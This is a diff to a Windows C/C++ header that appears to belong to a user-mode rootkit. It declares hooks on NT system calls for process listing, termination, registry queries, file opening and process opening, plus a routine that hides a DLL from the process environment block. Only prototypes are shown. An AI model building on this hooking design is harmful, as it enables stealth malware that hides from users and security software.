@@ -111,6 +111,12 @@ typedef NTSTATUS(WINAPI* pNtDeleteValueKey)(
   HANDLE KeyHandle,
   PUNICODE_STRING ValueName);
 
+typedef NTSTATUS(WINAPI* pNtOpenProcess)(
+    PHANDLE ProcessHandle, 
+    ACCESS_MASK DesiredAccess, 
+    POBJECT_ATTRIBUTES ObjectAttributes, 
+    PCLIENT_ID ClientId);
+
 mPPEB GetPeb(VOID);
 VOID RemoveEntryList(LIST_ENTRY*);
 BOOL RemoveDllFromPebW(LPCWSTR); 
@@ -119,7 +125,8 @@ DWORD GetPPID(DWORD);
 int GetProcessName(DWORD, char*, DWORD);
 bool IsExplorerProcess(void);
 PWCHAR KeyValueInformationGetName(LPVOID, NT_KEY_VALUE_INFORMATION_CLASS);
-bool CheckExists(std::wstring, std::wstring, bool);
+bool CheckExistsA(std::string, std::string, bool);
+bool CheckExistsW(std::wstring, std::wstring, bool);
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE, UINT);
@@ -128,6 +135,7 @@ NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE, PUNICODE_STRING, NT_KEY_VALUE_INFO
 NTSTATUS WINAPI HookedNtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
 // NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
 NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE, PUNICODE_STRING);
+NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
 
 extern pNtQuerySystemInformation OriginalNtQuerySystemInformation;
 extern pNtTerminateProcess OriginalNtTerminateProcess;
@@ -136,3 +144,4 @@ extern pNtQueryValueKey OriginalNtQueryValueKey;
 extern pNtOpenFile OriginalNtOpenFile;
 // extern pNtSetValueKey OriginalNtSetValueKey;
 extern pNtDeleteValueKey OriginalNtDeleteValueKey;
+extern pNtOpenProcess OriginalNtOpenProcess;
